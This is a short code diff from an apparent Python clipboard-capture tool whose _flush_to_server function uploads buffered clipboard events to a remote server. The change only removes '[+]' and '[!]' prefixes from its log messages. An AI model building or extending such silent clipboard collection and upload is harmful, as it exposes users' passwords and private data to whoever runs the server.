@@ -147,10 +147,10 @@ def _flush_to_server():
         with LOCK:
             SEND_BUFFER = SEND_BUFFER[len(logs_to_send):]
 
-        logger.info(f"[+] Sent {len(logs_to_send)} clipboard events to server")
+        logger.info(f"Sent {len(logs_to_send)} clipboard events to server")
 
     except Exception as e:
-        logger.error(f"[!] Send failed: {e}")
+        logger.error(f"Send failed: {e}")
 
 
 # =========================
